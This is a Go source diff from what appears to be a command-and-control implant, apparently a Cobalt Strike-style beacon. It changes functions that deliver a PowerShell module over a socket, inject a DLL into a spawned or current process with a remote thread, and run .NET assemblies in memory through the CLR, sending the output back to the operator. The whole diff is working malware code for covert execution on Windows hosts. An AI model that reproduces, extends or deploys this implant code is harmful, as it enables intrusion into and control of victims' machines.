@@ -40,7 +40,7 @@ func WebDelivery(b []byte) {
 		}
 		defer conn.Close()
 		httpHeader := util.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(powershellModule))
-		receive := make([]byte, 256)
+		receive := make([]byte, 1024)
 		_, _ = conn.Read(receive)
 		_, _ = conn.Write([]byte(httpHeader))
 		_, _ = conn.Write(powershellModule)
@@ -48,43 +48,52 @@ func WebDelivery(b []byte) {
 	}()
 }
 
+// it seems that some user custom plugins will use ExecAsm to inject dll,
+// maybe because normal inject dll doesn't accept args?
+// use go to execute C#, and dll inject to execute dll with args
 func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
+	// execAsm don't need to handle job
+	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
+	_, _, _, description, _, _, _ := parseExecAsm(b)
+	if string(description) != ".NET assembly" {
+		return execAsmInject(b, isDllX64, ignoreToken)
+	}
 	//return execAsmInject(b, isDllX64, ignoreToken)
 	return execAsmGo(b)
 }
 
+// TODO deal with raw reflective dll
 func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
-	// callBackType, sleepTime, offset, description, csharp, dll, err
-	callBackType, _, offset, _, csharp, dll, err := parseExecAsm(b)
+	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
+	callBackType, sleepTime, offset, _, args, dll, err := parseExecAsm(b)
 	if config.InjectSelf {
-		currentPid = windows.GetCurrentProcessId()
-		err = injectSelf(dll, offset, csharp)
+		hThread, err := injectSelf(dll, offset, args)
 		if err != nil {
-			currentPid = 0
+			return err
 		}
-		return err
+		_ = windows.CloseHandle(windows.Handle(hThread))
 	} else {
 		procInfo := &windows.ProcessInformation{}
 		startupInfo := &windows.StartupInfo{
 			Flags:      windows.STARTF_USESTDHANDLES,
 			ShowWindow: 1,
 		}
-		var readPipe, writePipe windows.Handle
+		var rPipe, wPipe windows.Handle
 		sa := windows.SecurityAttributes{
 			Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
 			SecurityDescriptor: nil,
 			InheritHandle:      1, //true
 		}
 
-		err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0)
+		err = windows.CreatePipe(&rPipe, &wPipe, &sa, 0)
 		if err != nil {
 			return errors.New(util.Sprintf("CreatePipe error: %s", err))
 		}
-		defer windows.CloseHandle(writePipe)
-		defer windows.CloseHandle(readPipe)
+		defer windows.CloseHandle(wPipe)
+		defer windows.CloseHandle(rPipe)
 		startupInfo.Flags = windows.STARTF_USESTDHANDLES
-		startupInfo.StdErr = writePipe
-		startupInfo.StdOutput = writePipe
+		startupInfo.StdErr = wPipe
+		startupInfo.StdOutput = wPipe
 
 		err = spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
 		defer windows.CloseHandle(procInfo.Process)
@@ -93,29 +102,17 @@ func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
 			return err
 		}
 
-		err = createRemoteThread(procInfo.Process, dll, offset, csharp)
+		err = createRemoteThread(procInfo.Process, dll, offset, args)
 		if err != nil {
 			return err
 		}
-		// always set to 15000, this is to long
-		//time.Sleep(time.Millisecond * time.Duration(sleepTime))
-		buf := make([]byte, 1024)
-		var read windows.Overlapped
-		// document said bytesRead can't be none under win7
-		var bytesRead uint32
-		err = windows.ReadFile(readPipe, buf, &bytesRead, &read)
-		if err != nil {
-			packet.ErrorMessage("error reading result")
-		}
-		packet.PushResult(int(callBackType), buf[:bytesRead])
-		windows.CloseHandle(writePipe)
-		windows.CloseHandle(readPipe)
-		return nil
+		return loopRead(procInfo.Process, rPipe, int(sleepTime), int(callBackType), nil)
 	}
+	return nil
 }
 
 func execAsmGo(b []byte) error {
-	// callBackType, sleepTime, offset, description, csharp, dll, err
+	// callBackType, sleepTime, offset, description, args(csharp), dll, err
 	callBackType, _, _, _, csharp, _, err := parseExecAsm(b)
 	// use golang to execute assembly directly
 	csharpBuf := bytes.NewBuffer(csharp)
@@ -129,7 +126,7 @@ func execAsmGo(b []byte) error {
 	if err != nil {
 		return errors.New(util.Sprintf("RedirectStdoutStderr error: %s", err))
 	}
-	runtimeHost, err := clr.LoadCLR("v4.8")
+	runtimeHost, err := clr.LoadCLR("v4")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadCLR error: %s", err))
 	}
@@ -138,9 +135,11 @@ func execAsmGo(b []byte) error {
 		return errors.New(util.Sprintf("LoadAssembly error: %s", err))
 	}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
+	if stdout != "" {
+		packet.PushResult(int(callBackType), []byte(stdout))
+	}
 	if stderr != "" {
 		return errors.New(stderr)
 	}
-	packet.PushResult(int(callBackType), []byte(stdout))
 	return nil
 }
